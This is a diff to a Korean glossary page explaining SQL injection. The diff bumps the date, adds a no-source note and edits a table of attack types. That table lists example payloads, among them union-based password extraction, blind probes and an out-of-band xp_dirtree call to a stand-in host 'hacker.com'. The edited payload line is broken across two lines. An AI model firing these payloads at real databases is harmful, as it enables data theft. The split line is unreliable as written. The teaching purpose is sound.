@@ -1,7 +1,7 @@
 ---
 title: SQL Injection — 보안 용어 해설
 created: 2026-06-10
-updated: 2026-06-10
+updated: 2026-06-21
 type: concept
 tags: [security, glossary, web, injection, vulnerability, owasp, database]
 sources: []
@@ -9,6 +9,9 @@ confidence: high
 ---
 
 # SQL Injection — 보안 용어 해설
+
+## 참고 URL
+- 외부 원문 URL 없음 (내부 정리 페이지)
 
 ## Step 1: 의미 풀이 및 쉬운 비유
 
@@ -93,7 +96,8 @@ SELECT * FROM users WHERE id = '1' OR '1'='1';
 | **Union-based** | `UNION` 키워드로 추가 쿼리 결과 반환 | `' UNION SELECT username,password FROM users --` |
 | **Blind (Boolean-based)** | 참/거짓 응답 차이로 정보 추론 | `' AND SUBSTRING(password,1,1)='a' --` |
 | **Blind (Time-based)** | 응답 지연으로 정보 추론 | `'; WAITFOR DELAY '0:0:5' --` |
-| **Out-of-band** | 다른 채널(DNS, HTTP)로 데이터 탈취 | `'; EXEC xp_dirtree '\hacker.comile' --` |
+| **Out-of-band** | 다른 채널(DNS, HTTP)로 데이터 탈취 | `'; EXEC xp_dirtree '\hacker.com
+ile' --` |
 | **Second Order** | 저장된 데이터가 나중에 쿼리될 때 실행 | 프로필에 악성 쿼리 저장 후 관리자 조회 시 실행 |
 
 ### 주요 공격 목표
